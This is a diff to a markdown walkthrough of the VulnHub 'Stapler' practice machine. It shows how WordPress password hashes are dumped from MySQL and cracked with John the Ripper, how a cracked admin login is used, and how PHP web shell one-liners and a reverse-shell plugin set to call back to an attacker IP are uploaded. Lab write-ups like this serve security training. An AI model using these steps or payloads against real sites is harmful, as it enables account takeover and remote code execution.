@@ -948,10 +948,126 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MySQL [(none)]> 
 ```
 
-At this point I have value extraction.
+At this point I have value extraction, with access to the database there are many t
+
+
+lets get the usernames for the WP login:
+
+``` msql
+use wordpress;
+select user_login,user_pass from wp_users;
+```
+yeilds: 
+
+```
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
+| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
+| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
+| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
+| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
+| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
+| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
+| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
+| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
+| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
+| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
+| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
+| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
+| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
+| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
+| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
++------------+------------------------------------+
+```
+
+Lets condense these down to [wp_users.txt](/assets/vulnhub_stuff/stapler/wp_users.txt) and try to crack the passwords with john the ripper.
+
+
+``` bash
+john wp_users.txt
+```
+
+we get some basic passwords from the default configuration:
+
+```
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+ylle             (Elly)
+monkey           (harry)
+football         (garry)
+cookie           (scott)
+# then in ASCII mode: 
+TOM              (Simon)
+```
+
+Brute force cracking based on ASCII string matches will take an age with this system, lets stop here and use the rockyou dictionary:
+
+```
+john wp_users.txt -wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+As john runs we begin to see passwords pop onto the screen. What we really want is the an account with wp-admin priveleges as this will give us full access to the wp-admin panel, which where we can abuse the site to get a reverse shell. By default the first user in a dB is the admin, if we can get the tool john to get user John's password we will be in a good postion.
+
+And look at that... we got John's password.
+
+```
+washere          (barry)
+incorrect        (John)
+0520             (Pam)
+passphrase       (heather)
+damachine        (Dave)
+partyqueen       (ZOE)
+```
+
+lets got to the admin panel and log in https://192.168.56.104:12380/blogblog/wp-admin/
+
+Success! 
+
+![wp-admin.png](/assets/vulnhub_stuff/stapler/wp-admin.png)
+
+
+At this point we want to try an achieve remote code execution (RCE). 
+As John's access is elevated we should have access to themes and plugins. Combine this with the fact that Word Press is served by PhP, 2 options immediately come to mind.
+
+1. Option A: Try to include webshell funtionality in a theme component.
+2. Option B: Try to upload a PhP shell as a wordpress plugin.
+
+Either option is potentially valid, but I'm going to try modifying a theme page to include php code. Dropping either of these two following two snippets will allow for code execution on the url:
+
+``` php
+<?php echo system($_GET["cmd"].' 2>&1'); ?>
+
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+```
+I have a through all the themes and can't find a php file I can edit.  
+At this point, the plugin is looking like a better option.
+
+If I can upload a php code in a file that launches a reverse shell I might get somewhere.
+
+Luckly Kali comes with a bunch in /usr/share/webshells/php/php-reverse-shell.php
+
+I'll edit the details so I can catch them in a netcat listener:
+
+``` php
+$ip = '192.168.56.1';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
+```
+
+and upload the file as a plugin 
+
+![evil-plugin.png](/assets/vulnhub_stuff/stapler/evil-plugin.png)
+
+when it asked for the FTP credentials I tried John's again but I recieved an auth error
+
+Going to the uploads directory though, I discover the shell upload succeeded:
+https://192.168.56.104:12380/blogblog/wp-content/uploads/
 
 
 > Bonus Shell upgrade - TODO
+Fix the web shell
+
 
 ``` bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -959,6 +1075,14 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo
 fg
 ```
+
+If I need an ftp server for the transfer:
+
+``` bash
+sudo apt-get install python-pyftpdlib
+# anonymous:anonymous@
+```
+
 
 # Hit Hard!
 
